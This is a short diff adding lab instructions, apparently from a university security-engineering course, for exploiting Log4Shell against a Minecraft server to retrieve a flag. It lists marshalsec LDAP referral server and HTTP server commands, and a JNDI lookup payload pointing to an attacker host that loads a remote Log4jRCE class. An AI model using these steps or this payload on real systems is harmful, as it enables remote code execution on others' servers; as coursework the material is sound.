@@ -1,0 +1,17 @@
+Make sure PATH includes mvn and JAVA_HOME points to the Java8 jdk in the directory.
+
+Open 3 shells in ~/Desktop/CS4401_Security_Engineering/host-share/Mine4shell/marshalsec
+
+
+On the first, run java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://130.215.217.133:8000/#Log4jRCE"
+
+On the second, run python3 -m http.server
+
+On the third (or in an IDE) run attackSide.java
+
+
+Open the mc server and enter ${jndi:ldap://ATTACKERCOMPUTERIP:1389/Log4jRCE}
+
+(This only worked on campus for me, I think it has to do with public facing IPs)
+
+The flag should be sent to attackSide.java and printed out to stdout.
